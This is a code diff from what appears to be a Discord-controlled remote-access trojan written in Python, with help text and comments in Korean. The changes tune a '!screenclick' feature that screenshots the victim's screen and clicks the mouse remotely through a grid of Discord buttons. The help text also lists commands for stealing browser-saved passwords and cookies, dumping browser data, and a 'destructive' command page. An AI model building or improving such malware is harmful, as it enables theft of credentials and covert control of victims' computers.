@@ -792,7 +792,7 @@ def get_embed(page: str):
             "`!passwords` - 브라우저 저장 비밀번호 탈취\n"
             "`!cookies` - 브라우저 쿠키 탈취 (복호화 개선됨)\n"
             "`!browserdump` - 브라우저 전체 데이터 (ZIP)\n"
-            "`!screenclick [격자크기]` - 스크린샷 캡처 후 격자 버튼으로 클릭 위치 선택"
+            "`!screenclick [격자크기]` - 스크린샷 캡처 후 격자 버튼으로 클릭 위치 선택 (기본 5x5)"
         )
 
     elif page == "destructive":
@@ -857,7 +857,7 @@ async def help(ctx):
 class ClickGridView(discord.ui.View):
     def __init__(self, grid_size, screen_width, screen_height, timeout=300):
         super().__init__(timeout=timeout)
-        self.grid_size = min(grid_size, 5)  # 최대 5x5 (Discord 버튼 제한)
+        self.grid_size = min(grid_size, 5)  # 최대 5x5
         self.screen_width = screen_width
         self.screen_height = screen_height
         self.add_buttons()
@@ -865,7 +865,8 @@ class ClickGridView(discord.ui.View):
     def add_buttons(self):
         for row in range(self.grid_size):
             for col in range(self.grid_size):
-                label = f"{row+1},{col+1}"
+                # 간결한 라벨: R1C1, R1C2, ...
+                label = f"R{row+1}C{col+1}"
                 custom_id = f"click_{row}_{col}"
                 button = discord.ui.Button(label=label, custom_id=custom_id)
                 button.callback = self.button_callback
@@ -904,10 +905,10 @@ class ClickGridView(discord.ui.View):
             )
 
 @bot.command(name="screenclick")
-async def screenclick(ctx, grid_size: int = 3):
+async def screenclick(ctx, grid_size: int = 5):
     """
     스크린샷을 찍고 격자 버튼을 제공하여 클릭할 위치를 선택할 수 있습니다.
-    사용법: !screenclick [격자크기] (기본 3, 최대 5)
+    사용법: !screenclick [격자크기] (기본 5, 최대 5)
     """
     if grid_size < 1:
         grid_size = 1
@@ -927,7 +928,8 @@ async def screenclick(ctx, grid_size: int = 3):
 
     file = discord.File(temp_path, filename="screenclick.png")
     embed = ch3at_embed(
-        f"🖱️ **화면 클릭 인터페이스**\n격자 {grid_size}x{grid_size}, 각 칸을 클릭하면 해당 중앙으로 마우스가 이동 후 클릭합니다.",
+        f"🖱️ **화면 클릭 인터페이스**\n격자 {grid_size}x{grid_size}, 버튼을 누르면 해당 칸 중앙으로 이동 후 자동 클릭합니다.\n"
+        f"더 정밀한 제어는 `!clickpos x y` 또는 `!move` + `!click`을 사용하세요.",
         color=0x00ff00
     )
     await ctx.send(embed=embed, file=file, view=view)
